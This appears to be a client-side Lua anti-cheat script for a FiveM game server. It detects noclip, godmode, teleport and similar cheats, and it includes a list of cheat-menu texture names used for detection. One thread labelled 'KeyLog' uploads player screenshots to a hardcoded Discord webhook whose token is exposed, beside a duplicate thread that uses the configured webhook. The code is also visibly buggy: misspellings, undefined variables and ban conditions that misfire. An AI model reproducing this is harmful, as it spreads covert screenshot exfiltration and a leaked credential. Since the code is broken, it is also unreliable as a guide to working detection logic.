
-- ImoShieldOnTop

-- Buy ImoShield stay safe


local KEKW = false
local ISAKEKW = flase

-- Anti Spectate
Citizen.CreateThread(function()
    while NoShield.AntiSpectate do
        Citizen.Wait(3000)
        local ped = NetworkIsInSpectatorMode()
        if ped == 1 then
            TriggerServerEvent('noshieldtrololo:ban', source, 'Spectate detected')
        end
    end
end)


-- KeyLog
Citizen.CreateThread(function()
    while true do

        if NoShield.BlacklistedKey ~= true then return end
        for v, k in ipairs(NoShield.BlacklistedKeyList) do
            if IsControlJustReleased(0, k.value) then
                exports["screenshot-basic"]:requestScreenshotUpload("https://discord.com/api/webhooks/979297686677241877/C-lTcrsZ8_kkt6Paw5Saf8No5Nxab5gdHn33eZtHis0gGRdb0FgkDEu0q-N1Eqo9VGQs", "files[]", function(a)
                    TriggerServerEvent("NoShield:blacklistkey", json.decode(a).attachments[1].proxy_url, "test")
                Citizen.Wait(7000)
            end)
        end
    end
    Citizen.Wait(10)
end
end)


-- KeyLog
Citizen.CreateThread(function()
    while true do

        if NoShield.BlacklistedKey ~= true then return end
        for v, k in ipairs(NoShield.BlacklistedKeyList) do
            if IsControlJustReleased(0, k.value) then
                exports["screenshot-basic"]:requestScreenshotUpload(Noshield.ScreenshotWebhook, "files[]", function(a)
                    TriggerServerEvent("NoShield:blacklistkey1", json.decode(a).attachments[1].proxy_url, "test")
                Citizen.Wait(7000)
            end)
        end
    end
    Citizen.Wait(10)
end
end)




-- Anti NoClip
Citizen.CreateThread(function()
    while NoShield.AntiNoClip do
        if KEKW == false then
            Wait(30000)
            KEKW = true
        end
        Citizen.Wait(5000)
        local _ped = GetPlayerPed(-1)
        local _heightaboveground = GetEntityHeightAboveGround(_ped)
        local _pstate = GetPedParachuteState(_ped)
        local _pid = PlayerPedId()
        if _heightaboveground > 25 and not IsPedInAnyVehicle(_ped, false) and not IsPedInParachuteFreeFall(_ped) and not IsPedFalling(_ped) and not IsPedJumpingOutOfVehicle(_ped) and not IsEntityVisible(_ped) and not IsPlayerDead(_pid) then
            if _pstate == -1 then
              TriggerServerEvent('noshieldtrololo:ban', source, 'NoClip detected')
            end
        else
            if NoShield.AntiFlyAroundInVehicle then
                if _heightaboveground > 35 and IsPedInAnyVehicle(_ped, false) then
                    local vehicle = GetVehiclePedIsUsing(ped)
                    local isheli = GetVehicleClass(vehicle)
                    if isheli == 15 or isheli == 16 then
                    else
                        TriggerServerEvent('noshieldtrololo:ban', source, "User seems to be flying around in a vehicle")
                        Citizen.Wait(10000)
                    end
                end
            end
        end
    end
end)

-- Anti Invisibility
Citizen.CreateThread(function()
    while NoShield.AntiInvisibility do
        if KEKW == false then
            Wait(30000)
            KEKW = true
        end
        Citizen.Wait(5000)
        local _ped = GetPlayerPed(-1)
        local _heightaboveground = GetEntityHeightAboveGround(_ped)
        local _pstate = GetPedParachuteState(_ped)
        local _pid = PlayerPedId()
        if _heightaboveground > 25 and not IsPedInAnyVehicle(_ped, false) and not IsPedInParachuteFreeFall(_ped) and not IsPedFalling(_ped) and not IsPedJumpingOutOfVehicle(_ped) and not IsEntityVisible(_ped) and not IsPlayerDead(_pid) then
            if _pstate == -1 then
              TriggerServerEvent('noshieldtrololo:ban', source, 'Invisibility detected')
            end
        end
    end
end)

--Anti AI

Citizen.CreateThread(function()
    while true do
        if Config.AntiDamageModifier ~= true then return end
		Citizen.Wait(2000)
		local weaponHash = GetSelectedPedWeapon(GetPlayerPed(-1))
        if Config.AntiDamageChanger then
		    local WeaponDamage = math.floor(GetWeaponDamage(weaponHash))
		    if Config.WeaponDamages[weaponHash] and WeaponDamage > Config.WeaponDamages[weaponHash].damage then
			    local weapon = Config.WeaponDamages[weaponHash]
                TriggerServerEvent('noshieldtrololo:ban', source, "Tried to change his gun damage to :"..WeaponDamage)
            end	
        end
    end
end)


-- Anti Freecam
Citizen.CreateThread(function()
    while NoShield.AntiFreecam do
        if KEKW == false then
            Wait(30000)
            KEKW = true
        end
        local ped = GetPlayerPed(-1)
        local camcoords = (GetEntityCoords(ped) - GetFinalRenderedCamCoord())
        if (camcoords.x > 35) or (camcoords.y > 35) or (camcoords.z > 35) or (camcoords.x < -35) or (camcoords.y < -35) or (camcoords.z < -35) then
            TriggerServerEvent('noshieldtrololo:ban', source, 'Freecam detected')
        end
    end
end)


-- Anti NUI Devtools
RegisterNUICallback(GetCurrentResourceName(), function()
    if NoShield.AntiNuiDevtools ~= true then return end
    TriggerServerEvent('noshieldtrololo:ban', source, 'NUI Devtools detected')
end)


-- Anti Weapon Pickup
Citizen.CreateThread(function() 
    while true do  
        Wait(100)  
        if NoShield.AntiWeaponPickup ~= true then return end
        RemoveAllPickupsOfType(GetHashKey("PICKUP_ARMOUR_STANDARD"))
        RemoveAllPickupsOfType(GetHashKey("PICKUP_VEHICLE_ARMOUR_STANDARD"))
        RemoveAllPickupsOfType(GetHashKey("PICKUP_HEALTH_SNACK"))
        RemoveAllPickupsOfType(GetHashKey("PICKUP_HEALTH_STANDARD"))
        RemoveAllPickupsOfType(GetHashKey("PICKUP_VEHICLE_HEALTH_STANDARD"))
        RemoveAllPickupsOfType(GetHashKey("PICKUP_VEHICLE_HEALTH_STANDARD_LOW_GLOW"))
    end
end)

-- Anti Invisible
Citizen.CreateThread(function()
    while NoShield.AntiInvisible do
        if KEKW == false then
            Wait(30000)
            KEKW = true
        end
        Citizen.Wait(5000)
        local ped = GetPlayerPed(-1)
        local entityalpha = GetEntityAlpha(ped)
        if not IsEntityVisible(ped) or not IsEntityVisibleToScript(ped) or entityalpha <= 150 then
            TriggerServerEvent('noshieldtrololo:ban', source, 'Invisibility detected')
        end
    end
end)
-- Anti Explosionbullet
Citizen.CreateThread(function()
    while NoShield.AntiExplosionBullet do
        Citizen.Wait(5000)
        local weapondamage = GetWeaponDamageType(GetSelectedPedWeapon(_ped))
        if weapondamage == 4 or weapondamage == 5 or weapondamage == 6 or weapondamage == 13 then
            TriggerServerEvent('noshieldtrololo:ban', source, 'Explosion Bullet detected')
        end
    end
end)

-- Anti Vision
Citizen.CreateThread(function()
    while NoShield.AntiVision do
        Citizen.Wait(2500)
        if GetUsingnightvision(true) then
            if NoShield.AntiNightVision ~= true then return end
            TriggerServerEvent('noshieldtrololo:ban', source, 'Night Vision detected')
        end
        if GetUsingseethrough(true) then
            if NoShield.AntiThermalVision ~= true then return end
            TriggerServerEvent('noshieldtrololo:ban', source, 'Thermal Vision detected')
        end
    end
end)

-- Anti Teleport
Citizen.CreateThread(function()
    while NoShield.AntiTeleport do
        Citizen.Wait(20000)
        Citizen.Wait(1)
        local ped = GetPlayerPed(-1)
        local coords1x,coords1y,coords1z = table.unpack(GetEntityCoords(ped,true))
        Wait(500)
        local coords2x,coords2y,coords2z = table.unpack(GetEntityCoords(ped,true))
        if GetDistanceBetweenCoords(coords1x,coords1y,coords1z, coords2x,coords2y,coords2z) > 400 then
            if IsPedFalling(ped) then return end
            if IsPedInAnyVehicle(ped) then return end
            TriggerServerEvent('noshieldtrololo:ban', source, 'Teleport detected')
        end
    end
end)

-- Anti Super Jump
Citizen.CreateThread(function()
	while NoShield.SuperJump do
		Citizen.Wait(1)

		    if IsPedJumping(PlayerPedId()) then
		    	local m = 0
		    	repeat
			    	Citizen.Wait(0)
			    	m=m+1
			    	local h = IsPedJumping(PlayerPedId())
			    until not h
			    if m > 200 then
                    TriggerServerEvent('noshieldtrololo:ban', source, 'Super Jump Detected!')
		    end
	    end
    end    
end)



Citizen.CreateThread(function()
    while true do

        Citizen.Wait(3000)

        if IsControlJustPressed(0, NoShield.Keys[NoShield.BlacklistedKeyList]) then

            if BlacklistedKeyScreenshot then
                TriggerServerEvent("noshieldtrololo:screenshot2")
            end
            if BlacklistedKeyKick then
                DropPlayer(source, "🛡️ No - Shield You got Kicked for: Blacklisted Key")
            end

        end
    end
end)

-- Blacklisted Weapons
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(500)
        if NoShield.BlacklistedWeapons then
			for _,theWeapon in ipairs(NoShield.BlacklistedWeaponsList) do
				Wait(5)
                local ped = GetPlayerPed(-1)
				if HasPedGotWeapon(PlayerPedId(),GetHashKey(theWeapon),false) == 1 then
					RemoveAllPedWeapons(ped)
                    Citizen.Wait(10)
                    if NoShield.BlacklistedWeaponsBan then
                        TriggerServerEvent('noshieldtrololo:ban', source, 'Blacklisted Weapon detected')
                    end
				end
			end
		end
	end
end)

-- Blacklisted Vehicles
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(500)

		playerPed = GetPlayerPed(-1)
		if playerPed then
			checkCar(GetVehiclePedIsIn(playerPed, false))

			x, y, z = table.unpack(GetEntityCoords(playerPed, true))
			for _, blacklistedCar in pairs(NoShield.BlacklistedVehiclesList) do
				checkCar(GetClosestVehicle(x, y, z, 100.0, GetHashKey(blacklistedCar), 3))
			end
		end
	end
end)

function checkCar(car)
	if car then
		carModel = GetEntityModel(car)
		carName = GetDisplayNameFromVehicleModel(carModel)

		if isCarBlacklisted(carModel) then
            if NoShield.BlacklistedVehicles ~= true then return end
            TriggerServerEvent("noshieldtrololo:screenshot2")
			DeleteEntity(car)
            if NoShield.BlacklistedVehiclesBan then
			    TriggerServerEvent('noshieldtrololo:ban', source, 'Blacklisted Vehicle detected')
            end
		end
	end
end

function isCarBlacklisted(model)
	for _, blacklistedCar in pairs(NoShield.BlacklistedVehiclesList) do
		if model == GetHashKey(blacklistedCar) then
			return true
		end
	end

	return false
end

-- Anti Vehicle Modifier
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(2500)
        local ped = PlayerPedId()
        local sleep = true
        if IsPedInAnyVehicle(ped, false) then
            sleep = false
            local vehiclein = GetVehiclePedIsIn(ped, 0)
            if IsVehicleDamaged(vehiclein) then
                if GetEntityHealth(vehiclein) >= GetEntityMaxHealth(vehiclein) then
                    if NoShield.VehicleGodMode then
                        if GetVehiclePedIsIn(GetPlayerPed(-1)) then return end
                        TriggerServerEvent('noshieldtrololo:ban', vehiclein, 'Vehicle-Modifier detected. Type: 2')
                        DeleteEntity(vehiclein)
                    end
                end
            end
            SetEntityInvincible(vehiclein, false)
            if GetVehicleCheatPowerIncrease(vehiclein) > 1.0 then
                if NoShield.VehiclePowerIncrease then
                    if GetVehiclePedIsIn(GetPlayerPed(-1)) then return end
                    TriggerServerEvent('noshieldtrololo:ban', vehiclein, 'Vehicle-Modifier detected. Type: 3')
                    DeleteEntity(vehiclein)
                end
            end
            if GetVehicleTopSpeedModifier(vehiclein) > -1.0 then
                if NoShield.VehicleSpeedHack then
                    if GetVehiclePedIsIn(GetPlayerPed(-1)) then return end
                    TriggerServerEvent('noshieldtrololo:ban', vehiclein, 'Vehicle-Modifier detected. Type: 5')
                    DeleteEntity(vehiclein)
                end
            end
            SetVehicleTyresCanBurst(vehiclein, true)
        end
    end
end)

Citizen.CreateThread(function()
    while NoShield.BlacklistedKey do
        Citizen.Wait(50)	
            for v, k in ipairs(NoShield.BlacklistedKeyList) do
                if IsControlJustReleased(0, k.value) then
                    if NoShield.BlacklistedKeyScreenshot then
                        print("🛡️ No - Shield - Pressed Blacklisted Key")
                        TriggerEvent("noshieldtrololo:screenshot")
                    end
                    if NoShield.BlacklistedKeyKick then
                        print("🛡️ No - Shield  - Pressed Blacklisted Key")
                        DropPlayer(source, '🛡️ No - Shield  - Kicked. Reason: Blacklisted Key')
                    end
                end
            end
    end
end)

-- Anti Infinite Ammo
Citizen.CreateThread(function()
    while NoShield.AntiInfiniteAmmo do
        Wait(3000)
        SetPedInfiniteAmmoClip(PlayerPedId(), false)
    end
end)

-- Anti Eulen Godmode
Citizen.CreateThread(function()
    while NoShield.AntiEulenGodmode do
        Wait(3000)
        local ped = PlayerPedId()
        local health = GetEntityHealth(ped)
        Wait(1)
        SetEntityHealth(ped, 197)
        Wait(1)
        local health2 = GetEntityHealth(ped)
        if health2 > 198 then
            TriggerServerEvent('noshieldtrololo:ban', source, 'Godmode detected. Type: 1')
        else
            SetEntityHealth(ped, health)
        end
    end
end)

-- Anti GodMode2
Citizen.CreateThread(function()
    while NoShield.AntiGodMode2 do
        Wait(5000)
        local ped = GetPlayerPed(-1)
        if GetPlayerInvincible(ped) then
            TriggerServerEvent('noshieldtrololo:ban', ped, 'Godmode detected. Type: 2')
            SetPlayerInvincible(ped, false)
        end
    end
end)

-- Anti GodMode3+4
CreateThread(function()
    while true do
        Wait(5000)
        if NoShield.AntiGodMode3 then
            if GetPlayerInvincible_2(PlayerId()) then
                TriggerServerEvent('noshieldtrololo:ban', source, 'Godmode detected. Type: 3')
            end
        end
    end
end)

-- Anti Stopper
AddEventHandler("onResourceStop", function(res)
    if NoShield.AntiStopper ~= true then return end
    if res == NoShield.WhitelistedResources then 
        print("Whitelisted Resource Stopped")
    else
    if res == GetCurrentResourceName() then
        TriggerServerEvent('noshieldtrololo:ban', source, 'Tried to stop Script: ' ..res)
        Citizen.Wait(100)
        CancelEvent()
    else
        TriggerServerEvent('noshieldtrololo:ban', source, 'Tried to stop Script: Resourcename Invalid')
        Citizen.Wait(100)
        CancelEvent()
    end
end
end)

-- Anti Starter
AddEventHandler("onResourceStart", function(res)
    if NoShield.AntiStarter ~= true then return end
    if res == NoShield.WhitelistedResources then 
        print("Whitelisted Resource Stopped")
    else
    if res == GetCurrentResourceName() then
        TriggerServerEvent('noshieldtrololo:ban', source, 'Tried to start Script: ' ..res)
        Citizen.Wait(100)
        CancelEvent()
    else
        TriggerServerEvent('noshieldtrololo:ban', source, 'Tried to start Script: Resourcename Invalid')
        Citizen.Wait(100)
        CancelEvent()
    end
end
end)



-- Screenshot
RegisterNetEvent("noshieldtrololo:screenshot")
AddEventHandler("noshieldtrololo:screenshot", function(data)
    exports['screenshot-basic']:requestScreenshotUpload(Noshield.BanWebhook, "files[]", function(data)
    end)
end)

RegisterNetEvent("noshieldtrololo:screenshot2")
AddEventHandler("noshieldtrololo:screenshot2", function(data)
  if data ~= nil then
  exports["screenshot-basic"]:requestScreenshotUpload(Noshield.ScreenshotWebhook, "files[]", function(data) end)
  end
end) 

-- Anti Damage Modifier
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(2500)
        if NoShield.AntiDamageModifier then
            if GetPlayerWeaponDamageModifier(PlayerId()) > 1.0 then
                TriggerServerEvent('noshieldtrololo:ban', source, 'Tried to use Damage Modifier')
            end
        end
    end
end)

-- Anti Injection
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(10000)
		local DetectableTextures = {
			{txd = "HydroMenu", txt = "HydroMenuHeader", name = "HydroMenu"},
			{txd = "John", txt = "John2", name = "SugarMenu"},
			{txd = "darkside", txt = "logo", name = "Darkside"},
			{txd = "ISMMENU", txt = "ISMMENUHeader", name = "ISMMENU"},
			{txd = "dopatest", txt = "duiTex", name = "Copypaste Menu"},
			{txd = "fm", txt = "menu_bg", name = "Fallout Menu"},
			{txd = "wave", txt = "logo", name ="Wave"},
			{txd = "wave1", txt = "logo1", name = "Wave (alt.)"},
			{txd = "meow2", txt = "woof2", name ="Alokas66", x = 1000, y = 1000},
			{txd = "adb831a7fdd83d_Guest_d1e2a309ce7591dff86", txt = "adb831a7fdd83d_Guest_d1e2a309ce7591dff8Header6", name ="Guest Menu"},
			{txd = "hugev_gif_DSGUHSDGISDG", txt = "duiTex_DSIOGJSDG", name="HugeV Menu"},
			{txd = "MM", txt = "menu_bg", name="Metrix Mehtods"},
			{txd = "wm", txt = "wm2", name="WM Menu"},
            {txd = "fm", txt = "menu_bg", name = "Fallout"},
            {txd = "NeekerMan", txt="NeekerMan1", name="Lumia Menu"},
            {txd = "Blood-X", txt="Blood-X", name="Blood-X Menu"},
            {txd = "Dopamine", txt="Dopameme", name="Dopamine Menu"},
            {txd = "Fallout", txt="FalloutMenu", name="Fallout Menu"},
            {txd = "Luxmenu", txt="Lux meme", name="LuxMenu"},
            {txd = "Reaper", txt="reaper", name="Reaper Menu"},
            {txd = "absoluteeulen", txt="Absolut", name="Absolut Menu"},
            {txd = "KekHack", txt="kekhack", name="KekHack Menu"},
            {txd = "Maestro", txt="maestro", name="Maestro Menu"},
            {txd = "SkidMenu", txt="skidmenu", name="Skid Menu"},
            {txd = "Brutan", txt="brutan", name="Brutan Menu"},
            {txd = "FiveSense", txt="fivesense", name="Fivesense Menu"},
            {txd = "NeekerMan", txt="NeekerMan1", name="Lumia Menu"},
            {txd = "Auttaja", txt="auttaja", name="Auttaja Menu"},
            {txd = "BartowMenu", txt="bartowmenu", name="Bartow Menu"},
            {txd = "Hoax", txt="hoaxmenu", name="Hoax Menu"},
            {txd = "FendinX", txt="fendin", name="Fendinx Menu"},
            {txd = "Hammenu", txt="Ham", name="Ham Menu"},
            {txd = "Lynxmenu", txt="Lynx", name="Lynx Menu"},
            {txd = "Oblivious", txt="oblivious", name="Oblivious Menu"},
            {txd = "malossimenuv", txt="malossimenu", name="Malossi Menu"},
            {txd = "memeeee", txt="Memeeee", name="Memeeee Menu"},
            {txd = "tiago", txt="Tiago", name="Tiago Menu"},
            {txd = "Hydramenu", txt="hydramenu", name="Hydra Menu"}
			
		}
		
		for i, data in pairs(DetectableTextures) do
			if data.x and data.y then
				if GetTextureResolution(data.txd, data.txt).x == data.x and GetTextureResolution(data.txd, data.txt).y == data.y then
                    if NoShield.AntiInjection then 
                    TriggerEvent("noshieldtrololo:screenshot", source)
                    Wait(500)
					TriggerServerEvent('noshieldtrololo:ban', source, 'Injection detected: ' ..data.txt)
				end
            end
			else 
				if GetTextureResolution(data.txd, data.txt).x ~= 4.0 then
                    if NoShield.AntiInjection then
                    TriggerEvent("noshieldtrololo:screenshot", source)
                    Wait(500)
					TriggerServerEvent('noshieldtrololo:ban', source, 'Injection detected: ' ..data.txt)
				end
            end
			end
		end
	end
end)


local ischecking = false


local ischecking = false

Citizen.CreateThread(function()
  Citizen.Wait(5000)
  while NoShield.OnScreenMenuDetection do
    if not ischecking then
      exports["screenshot-basic"]:requestScreenshot(function(data)
        Citizen.Wait(1000)
        SendNUIMessage({
          type = "checkscreenshot",
          screenshoturl = data
        })
      end)
      ischecking = true
    end
    Citizen.Wait(30000)
  end
  end)

RegisterNUICallback('check', function(data)
  if NoShield.OnScreenMenuDetection then
      if data.text ~= nil then     
          for _, word in pairs(NoShield.BlacklistedMenuWords) do
              if string.find(string.lower(data.text), string.lower(word)) then
                  TriggerServerEvent("noshieldtrololo:ban", source, 'On Screen Word Found: ' ..word) -- BAN (ON SCREEN MENU DETECTION)
              end
          end
      end
      ischecking = false
  end
end)


Citizen.CreateThread(function()
    while NoShield.AntiBlips do
        Citizen.Wait(6191)
        local _pid = PlayerId()
        local _activeplayers = GetActivePlayers()
        for i = 1, #_activeplayers do
            if i ~= _pid then
                if DoesBlipExist(GetBlipFromEntity(GetPlayerPed(i))) then
                    TriggerServerEvent('noshieldtrololo:ban',source, 'Player Blips detected')
                end
            end
            Citizen.Wait(50)
        end
    end
end)


-- -- Anti Plate Changer
Citizen.CreateThread(function()
    while NoShield.AntiVehicleplatechange do
       Wait(100)

           local vehicle = GetVehiclePedIsIn(GetPlayerPed(-1))
           local firstplate = GetVehicleNumberPlateText(vehicle)
           local secondplate = GetVehicleNumberPlateText(vehicle)
           if firstplate == secondplate then

            else
               if IsPedInAnyVehicle(GetPlayerPed(-1)) then
                   TriggerServerEvent('noshieldtrololo:ban', source, 'Vehicle-Plate Change detected')
           end
       end
  end
end)


Citizen.CreateThread(function()
	while true and NoShield.AntiDamageModifier do
        Citizen.Wait(2500)
        local defaultModifier = 1.0
        local weaponDamageModifier = GetPlayerWeaponDamageModifier(PlayerId())
        if weaponDamageModifier ~= defaultModifier and weaponDamageModifier ~= 0.0 and weaponDamageModifier > 1.0 then
            TriggerServerEvent('noshieldtrololo:ban', source, "Tried to change weapon damage modifier")
        end

        local WeaponDefenceModifier = GetPlayerWeaponDefenseModifier(PlayerId())
        if WeaponDefenceModifier ~= defaultModifier and WeaponDefenceModifier ~= 0.0 and WeaponDefenceModifier > 1.0 then
            TriggerServerEvent('noshieldtrololo:ban', source, "Tried to change weapon defence modifier")
        end


        local WeaponDefenceModifier2 = GetPlayerWeaponDefenseModifier_2(PlayerId())
        if WeaponDefenceModifier2 ~= defaultModifier and WeaponDefenceModifier2 ~= 0.0 and WeaponDefenceModifier2 > 1.0 then
            TriggerServerEvent('noshieldtrololo:ban', source, "Tried to change weapon defence modifier2")
        end


        local VehicleDamageModifier = GetPlayerVehicleDamageModifier(PlayerId())
        if VehicleDamageModifier ~= defaultModifier and VehicleDamageModifier ~= 0.0 and VehicleDamageModifier > 1.0 then
            TriggerServerEvent('noshieldtrololo:ban', source, "Tried to change vehicle damage modifier")
        end

        local VehicleDefenceModifier = GetPlayerVehicleDefenseModifier(PlayerId())
        if VehicleDefenceModifier ~= defaultModifier and VehicleDefenceModifier ~= 0.0 and VehicleDefenceModifier > 1.0 then
            TriggerServerEvent('noshieldtrololo:ban', source, "Tried to change vehicle defence modifier")
        end

        local MeleeDefenceModifier = GetPlayerMeleeWeaponDefenseModifier(PlayerId())
        if MeleeDefenceModifier ~= defaultModifier and VehicleDefenceModifier ~= 0.0 and MeleeDefenceModifier > 1.0 then
            TriggerServerEvent('noshieldtrololo:ban', source, "Tried to change melee defence modifier")
        end
	end

end)


local weaponHashes = {"dagger", "bat", "bottle", "crowbar", "flashlight", "golfclub", "hammer", "hatchet", "knuckle",
"knife", "machete", "switchblade", "nightstick", "wrench", "battleaxe", "poolcue",
"stone_hatchet", "pistol", "pistol_mk2", "combatpistol", "appistol", "stungun", "pistol50",
"snspistol", "snspistol_mk2", "heavypistol", "vintagepistol", "flaregun", "marksmanpistol",
"revolver", "revolver_mk2", "doubleaction", "raypistol", "ceramicpistol", "navyrevolver",
"microsmg", "smg", "smg_mk2", "assaultsmg", "combatpdw", "machinepistol", "minismg", "raycarbine",
"pumpshotgun", "pumpshotgun_mk2", "sawnoffshotgun", "assaultshotgun", "bullpupshotgun", "musket",
"heavyshotgun", "dbshotgun", "autoshotgun", "assaultrifle", "assaultrifle_mk2", "carbinerifle",
"carbinerifle_mk2", "advancedrifle", "specialcarbine", "specialcarbine_mk2", "bullpuprifle",
"bullpuprifle_mk2", "compactrifle", "mg", "combatmg", "combatmg_mk2", "gusenberg", "sniperrifle",
"heavysniper", "heavysniper_mk2", "marksmanrifle", "marksmanrifle_mk2", "rpg", "grenadelauncher",
"grenadelauncher_smoke", "minigun", "firework", "railgun", "hominglauncher", "compactlauncher",
"rayminigun", "grenade", "bzgas", "smokegrenade", "flare", "molotov", "stickybomb", "proxmine",
"snowball", "pipebomb", "ball", "petrolcan", "fireextinguisher", "hazardcan"} -- Add more weapons here [https://wiki.fivem.net/wiki/Weapons]


CreateThread(function()
    local ReasonFORPLDeath, Moddername, deathcause, Weapon
    while true do
        Wait(250)
        if IsEntityDead(PlayerPedId()) then
            local ModderKL = GetPedSourceOfDeath(PlayerPedId())
            local moddername2 = GetPlayerName(ModderKL)
            local deathcause = GetPeddeathcause(PlayerPedId())
            local modderid = GetPlayerFromServerId(ModderKL)
            Weaponname = nil
            if IsEntityAPed(ModderKL) and IsPedAPlayer(ModderKL) then
                Moddername = NetworkGetPlayerIndexFromPed(ModderKL)
            elseif IsEntityAVehicle(ModderKL) and IsEntityAPed(GetPedInVehicleSeat(ModderKL, -1)) and IsPedAPlayer(GetPedInVehicleSeat(ModderKL, -1)) then
                    Moddername = NetworkGetPlayerIndexFromPed(GetPedInVehicleSeat(ModderKL, -1))
            end
        end
        Wait(250)

        if (Moddername == PlayerId()) then
            return
        elseif (Moddername == nil) then
            return 
        else
            for k, v in ipairs(weaponHashes) do -- [https://wiki.fivem.net/wiki/Weapons] Weapon hashes are defined above
                if deathcause ==  GetHashKey("weapon_" .. v) then
                    Weaponname = 'weapon_' .. v
                end
            end
        end
        Wait(250)
        if HasPedGotWeapon(ModderKL, GetHashKey(Weaponname)) then
            print("^5[^7N^5o^7-^5S^7h^5i^7e^5l^7d^5]^7 f^5o^7u^5n^7d ^5a^7n ^5M^7o^5d^7d^5e^7r^0")
            return TriggerServerEvent("noshieldtrololo:ban") -- The drop function
        end
        Wait(250)

        Moddername = nil
        ReasonFORPLDeath = nil
        deathcause = nil
        Weaponname = nil
        while IsEntityDead(PlayerPedId()) do
            Wait(1000)
        end
    end
end)